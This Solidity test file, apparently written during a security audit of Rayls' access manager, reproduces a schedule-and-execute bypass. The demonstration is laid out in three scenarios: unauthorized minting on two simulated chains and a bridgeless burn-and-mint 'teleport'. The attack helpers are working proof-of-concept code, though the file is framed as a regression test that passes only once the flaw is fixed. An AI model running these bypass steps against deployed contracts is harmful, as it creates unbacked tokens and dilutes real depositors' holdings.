// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// NOTE: the AccessManager schedule+execute bypass here is a LIVE property (teleport is only the
// vehicle); re-home the assertion onto a non-teleport target before deleting this file.

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {RaylsAccessManagerV1} from "../../../privateHub/AccessControl/RaylsAccessManagerV1.sol";
import {RaylsAccessManaged} from "../../../privateHub/AccessControl/RaylsAccessManaged.sol";

/**
 * @title F01_CrossChainFinancialImpact
 * @notice Concrete demonstration that the F01 schedule+execute bypass produces
 *         FUND-LOSS scenarios across the Rayls topology.
 *
 *         Each chain (PNH, every PN) deploys its OWN RaylsAccessManagerV1.
 *         The bug is per-manager — bypassing one manager only affects that
 *         chain's contracts. BUT the bypass mechanic is identical on every
 *         chain. The same attacker EOA can perform the bypass on every chain
 *         independently, with no relayer interaction, no cross-chain message,
 *         and no privileged setup.
 *
 *         This file proves the cross-chain impact by simulating two
 *         independent privacy nodes (PN-A and PN-B), each with its own access
 *         manager and its own token-handler-style contract. We then run the
 *         attacker through three scenarios:
 *
 *         SCENARIO 1 — Direct mint on PN-A. Pure value creation.
 *         SCENARIO 2 — Independent mint on PN-B. Demonstrates that the bug is
 *                      not "fixed" by air-gapping chains.
 *         SCENARIO 3 — Cross-chain teleport WITHOUT the bridge: attacker
 *                      bypasses PN-A's manager to burn tokens on PN-A, then
 *                      bypasses PN-B's manager to mint the burnt tokens on
 *                      PN-B — bypassing the relayer entirely. The bridge's
 *                      conservation invariant is still satisfied (burn-mint),
 *                      but the source of authority is the bug, not the role
 *                      system.
 *
 *         All three reproductions FAIL pre-fix and PASS post-fix. The pass
 *         condition is "attacker holds 0 tokens on every chain".
 * @custom:deprecated Decommissioning Teleport (vanilla, atomic).
 */
contract F01_CrossChainFinancialImpact is Test {
    address internal admin_A;
    address internal admin_B;
    address internal attacker;
    address internal innocentDepositor;
    address internal messageExecutor; // relayer-style role on each chain

    RaylsAccessManagerV1 internal manager_A;
    RaylsAccessManagerV1 internal manager_B;

    // Simulated cross-chain token: a minimal RaylsAccessManaged ERC20 stub
    // that mirrors the security-relevant surface of RaylsErc20Handler.
    SimpleCrossChainToken internal token_A;
    SimpleCrossChainToken internal token_B;

    function setUp() public {
        admin_A = makeAddr("ADMIN_A");
        admin_B = makeAddr("ADMIN_B");
        attacker = makeAddr("ATTACKER");
        innocentDepositor = makeAddr("INNOCENT_DEPOSITOR");
        messageExecutor = makeAddr("LEGITIMATE_RELAYER");

        // Each chain has its OWN access manager (this is the real Rayls
        // topology — one RaylsAccessManagerV1 per chain).
        manager_A = _deployManager(admin_A);
        manager_B = _deployManager(admin_B);

        // Deploy "token handlers" on each chain. Each is wired only to its
        // own chain's access manager — there is no shared authority.
        token_A = new SimpleCrossChainToken("PN-A Token", "TOKA", address(manager_A));
        token_B = new SimpleCrossChainToken("PN-B Token", "TOKB", address(manager_B));

        // Map the receiveTeleport selector to a MESSAGE_EXECUTOR role on each
        // chain — accurately modelling the production wiring where only the
        // relayer can credit a teleport. (This is the role we will bypass.)
        _wireRelayerRole(manager_A, address(token_A), messageExecutor);
        _wireRelayerRole(manager_B, address(token_B), messageExecutor);

        // Seed: an innocent depositor genuinely has 1000 tokens on PN-A.
        // The attacker will use the bypass to mint themselves more out of
        // thin air, demonstrating the conservation invariant is broken.
        vm.prank(admin_A);
        token_A.mint(innocentDepositor, 1_000 ether);
        vm.prank(admin_B);
        token_B.mint(innocentDepositor, 1_000 ether);
    }

    function _deployManager(address admin) internal returns (RaylsAccessManagerV1) {
        RaylsAccessManagerV1 mgrImpl = new RaylsAccessManagerV1();
        bytes memory mgrInit = abi.encodeCall(RaylsAccessManagerV1.initialize, (admin));
        return RaylsAccessManagerV1(address(new ERC1967Proxy(address(mgrImpl), mgrInit)));
    }

    function _wireRelayerRole(
        RaylsAccessManagerV1 mgr,
        address tokenAddr,
        address relayer
    ) internal {
        // Find the manager's admin (admin_A or admin_B based on which mgr).
        address chainAdmin = (mgr == manager_A) ? admin_A : admin_B;
        vm.startPrank(chainAdmin);
        uint64 relayerRole = mgr.registerRole("MESSAGE_EXECUTOR");
        bytes4[] memory selectors = new bytes4[](2);
        selectors[0] = SimpleCrossChainToken.receiveTeleport.selector;
        selectors[1] = SimpleCrossChainToken.mint.selector;
        uint64[] memory roles = new uint64[](1);
        roles[0] = relayerRole;
        // mint stays admin-only; receiveTeleport is mapped to MESSAGE_EXECUTOR.
        bytes4[] memory recvSelector = new bytes4[](1);
        recvSelector[0] = SimpleCrossChainToken.receiveTeleport.selector;
        mgr.addFunctionAllowedRoles(tokenAddr, recvSelector, roles);
        mgr.grantRole(relayerRole, relayer, 0);
        vm.stopPrank();
    }

    /// Helper used by scenario tests.
    function _attackerBypassMint(
        RaylsAccessManagerV1 mgr,
        SimpleCrossChainToken tok,
        address recipient,
        uint256 amount
    ) internal returns (bool sched, bool exec) {
        bytes memory call = abi.encodeCall(
            SimpleCrossChainToken.mint, (recipient, amount)
        );
        vm.prank(attacker);
        try mgr.schedule(address(tok), call, 0) {
            sched = true;
        } catch {
            sched = false;
        }
        if (sched) {
            vm.prank(attacker);
            try mgr.execute(address(tok), call) {
                exec = true;
            } catch {
                exec = false;
            }
        }
    }

    function _attackerBypassReceiveTeleport(
        RaylsAccessManagerV1 mgr,
        SimpleCrossChainToken tok,
        address recipient,
        uint256 amount
    ) internal returns (bool sched, bool exec) {
        bytes memory call = abi.encodeCall(
            SimpleCrossChainToken.receiveTeleport, (recipient, amount)
        );
        vm.prank(attacker);
        try mgr.schedule(address(tok), call, 0) {
            sched = true;
        } catch {
            sched = false;
        }
        if (sched) {
            vm.prank(attacker);
            try mgr.execute(address(tok), call) {
                exec = true;
            } catch {
                exec = false;
            }
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    //  SCENARIO 1 — Direct mint on PN-A.
    //  Attacker creates value out of thin air on a single chain.
    //  This is the simplest fund-loss case.
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_scenario1_attacker_mints_on_PN_A_pure_value_creation() public {
        uint256 attackerBefore = token_A.balanceOf(attacker);
        uint256 supplyBefore = token_A.totalSupply();

        (bool sched, bool exec) = _attackerBypassMint(
            manager_A, token_A, attacker, 1_000_000 ether
        );

        uint256 attackerAfter = token_A.balanceOf(attacker);
        uint256 supplyAfter = token_A.totalSupply();

        if (attackerAfter > attackerBefore) {
            console2.log("F01-SCENARIO1: ATTACKER MINTED 1M TOKENS ON PN-A");
            console2.log("scheduled:", sched, " executed:", exec);
            console2.log("attacker balance:", attackerBefore, "->", attackerAfter);
            console2.log("totalSupply:", supplyBefore, "->", supplyAfter);
            console2.log("Innocent depositor's 1000 tokens are now diluted in a 1,001,000 supply.");
            console2.log("If TOKA trades at $1, attacker has $1M of newly-created notional value.");
        }

        assertEq(attackerAfter, 0, "F01-SCENARIO1: attacker minted on PN-A via the bypass");
    }

    // ─────────────────────────────────────────────────────────────────────
    //  SCENARIO 2 — Independent mint on PN-B.
    //  Demonstrates the bypass works against EACH chain's manager
    //  independently. There is no shared authority — the bug is per-manager
    //  but it exists on every manager identically.
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_scenario2_attacker_mints_on_PN_B_independently() public {
        uint256 before_ = token_B.balanceOf(attacker);

        (bool sched, bool exec) = _attackerBypassMint(
            manager_B, token_B, attacker, 500_000 ether
        );

        uint256 after_ = token_B.balanceOf(attacker);

        if (after_ > before_) {
            console2.log("F01-SCENARIO2: ATTACKER MINTED 500K TOKENS ON PN-B");
            console2.log("scheduled:", sched, " executed:", exec);
            console2.log("This proves the bypass works on ANY chain in the topology.");
            console2.log("Air-gapping chains DOES NOT mitigate the bug.");
        }

        assertEq(after_, 0, "F01-SCENARIO2: attacker minted on PN-B via the bypass");
    }

    // ─────────────────────────────────────────────────────────────────────
    //  SCENARIO 3 — "Cross-chain teleport" without going through the bridge.
    //  Attacker uses the bypass on PN-A to BURN 1000 tokens (real value),
    //  then uses the bypass on PN-B to MINT 1000 tokens to themselves via
    //  the receiveTeleport entry point — the function normally reachable
    //  ONLY by the MESSAGE_EXECUTOR role (relayer).
    //
    //  The conservation invariant (burn-on-A == mint-on-B) is satisfied,
    //  so this attack would be invisible to any monitor that just compares
    //  total supply across chains. But the source of authority is the bug,
    //  not the relayer/bridge — no off-chain message ever crossed.
    // ─────────────────────────────────────────────────────────────────────
    function test_F01_scenario3_cross_chain_teleport_without_the_bridge() public {
        // Phase 1 — attacker mints themselves 1000 TOKA out of thin air on PN-A
        // (we use scenario 1's mechanic to get tokens to burn).
        _attackerBypassMint(manager_A, token_A, attacker, 1_000 ether);
        uint256 aAfterMint = token_A.balanceOf(attacker);

        // Phase 2 — attacker bypasses PN-A's manager again to BURN their
        // 1000 TOKA. This makes the cross-chain accounting "look honest".
        bytes memory burnCall = abi.encodeCall(
            SimpleCrossChainToken.burn, (attacker, 1_000 ether)
        );
        vm.prank(attacker);
        try manager_A.schedule(address(token_A), burnCall, 0) {} catch {}
        vm.prank(attacker);
        try manager_A.execute(address(token_A), burnCall) {} catch {}
        uint256 aAfterBurn = token_A.balanceOf(attacker);

        // Phase 3 — attacker bypasses PN-B's manager to call receiveTeleport
        // (the relayer-only entry) and mint 1000 TOKB to themselves. No
        // cross-chain message was ever emitted; PN-B's relayer never saw
        // anything. But the attacker is now holding 1000 TOKB.
        (bool sched, bool exec) = _attackerBypassReceiveTeleport(
            manager_B, token_B, attacker, 1_000 ether
        );
        uint256 bAfterTeleport = token_B.balanceOf(attacker);

        if (bAfterTeleport > 0) {
            console2.log("F01-SCENARIO3: BRIDGELESS CROSS-CHAIN ATTACK SUCCESSFUL");
            console2.log("PN-A attacker balance after mint:", aAfterMint);
            console2.log("PN-A attacker balance after burn:", aAfterBurn);
            console2.log("PN-B attacker balance after fake teleport:", bAfterTeleport);
            console2.log("scheduled:", sched, " executed:", exec);
            console2.log("Conservation invariant (burn = mint) is satisfied,");
            console2.log("but no cross-chain message was ever emitted.");
            console2.log("Off-chain monitors comparing total supply will see no anomaly.");
        }

        assertEq(bAfterTeleport, 0, "F01-SCENARIO3: bridgeless cross-chain attack landed via dual bypass");
    }
}

/**
 * Minimal cross-chain-token-handler stub. Mirrors the security-relevant
 * surface of RaylsErc20Handler but without the cross-chain plumbing:
 *  - mint(address,uint256)            — restricted (admin)
 *  - burn(address,uint256)            — restricted (admin)
 *  - receiveTeleport(address,uint256) — restricted (MESSAGE_EXECUTOR)
 *
 * The role mappings are configured in the test setup. Without them, every
 * selector defaults to ADMIN-only.
 */
contract SimpleCrossChainToken is RaylsAccessManaged {
    string public name;
    string public symbol;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory _name, string memory _symbol, address _authority) {
        name = _name;
        symbol = _symbol;
        _initializeAuthority(_authority);
    }

    function mint(address to, uint256 value) external restricted {
        balanceOf[to] += value;
        totalSupply += value;
        emit Transfer(address(0), to, value);
    }

    function burn(address from, uint256 value) external restricted {
        balanceOf[from] -= value;
        totalSupply -= value;
        emit Transfer(from, address(0), value);
    }

    function receiveTeleport(address to, uint256 value) external restricted {
        balanceOf[to] += value;
        totalSupply += value;
        emit Transfer(address(0), to, value);
    }
}
